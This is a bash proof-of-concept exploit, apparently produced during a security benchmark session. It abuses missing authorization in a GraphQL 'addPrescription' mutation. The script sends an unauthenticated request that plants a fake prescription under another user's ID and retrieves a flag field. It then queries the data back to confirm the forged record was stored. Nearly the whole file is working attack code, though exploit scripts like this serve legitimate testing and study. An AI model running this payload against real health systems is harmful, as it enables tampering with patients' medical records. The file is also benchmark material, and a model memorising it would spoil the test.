#!/bin/bash
# POC: Demonstrates authorization bypass in GraphQL addPrescription mutation allowing unauthorized prescription creation for any userId without authentication
# Target: ./repo
# Created: 2025-11-10T18:28:14.028Z
# Session: benchmark-XBEN-007-24-mhtgyyde

# Authorization Bypass POC - GraphQL addPrescription Mutation
# This POC demonstrates the vulnerability where any user can create prescriptions
# for any userId without proper authorization checks

TARGET_URL="${1:-http://localhost:5003/graphql}"
VICTIM_USERID="${2:-2}"

echo "[*] GraphQL Authorization Bypass - addPrescription Mutation POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Victim UserID: $VICTIM_USERID"
echo ""

echo "[*] Executing GraphQL mutation without authentication..."
echo ""

# Create properly escaped JSON payload
PAYLOAD=$(cat <<EOF
{
  "query": "mutation { addPrescription(userId: $VICTIM_USERID prescriptionDetails: \\"Unauthorized prescription injected by attacker - PWNED\\") { prescription { id userId prescriptionDetails flag } } }"
}
EOF
)

echo "[*] Sending mutation request..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD")

echo "[*] Response received:"
echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
echo ""

# Check if the mutation was successful
if echo "$RESPONSE" | grep -q '"id"'; then
    echo "[+] SUCCESS: Mutation executed without authorization!"
    echo "[+] Prescription created for userId=$VICTIM_USERID"
    
    # Extract the prescription ID from response
    PRESCRIPTION_ID=$(echo "$RESPONSE" | jq -r '.data.addPrescription.prescription.id' 2>/dev/null)
    
    if [ "$PRESCRIPTION_ID" != "null" ] && [ -n "$PRESCRIPTION_ID" ]; then
        echo "[+] Created Prescription ID: $PRESCRIPTION_ID"
        echo ""
        echo "[*] Verifying the unauthorized prescription persists in the system..."
        
        # Verify with getPrescriptions query that the malicious prescription was stored
        VERIFY_PAYLOAD=$(cat <<EOF
{
  "query": "query { getPrescriptions(userId: $VICTIM_USERID) { id userId prescriptionDetails flag } }"
}
EOF
)
        
        VERIFY_RESPONSE=$(curl -s -X POST "$TARGET_URL" \
          -H "Content-Type: application/json" \
          -d "$VERIFY_PAYLOAD")
        
        echo "[*] Verification Query Response:"
        echo "$VERIFY_RESPONSE" | jq . 2>/dev/null || echo "$VERIFY_RESPONSE"
        
        if echo "$VERIFY_RESPONSE" | grep -q "Unauthorized prescription injected by attacker"; then
            echo ""
            echo "[+] CONFIRMED: Malicious prescription is now stored in the system!"
            echo "[+] Authorization bypass confirmed - any user can modify any userId's data"
            exit 0
        fi
    fi
else
    echo "[-] Could not parse successful response"
    exit 1
fi